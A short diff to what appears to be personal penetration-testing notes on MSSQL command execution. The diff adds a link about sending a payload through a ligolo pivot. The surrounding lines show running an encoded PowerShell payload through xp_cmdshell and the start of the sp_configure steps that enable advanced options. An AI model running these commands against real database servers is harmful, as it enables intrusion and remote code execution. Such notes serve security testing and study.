@@ -126,6 +126,8 @@ Powershell #3 base64
 xp_cmdshell powershell -e [payload]
 ```
 
+[[Sending payload reverse direction through ligolo pivot]]
+
 ```mssql
 -- To allow advanced options to be changed.  
 EXECUTE sp_configure 'show advanced options', 1
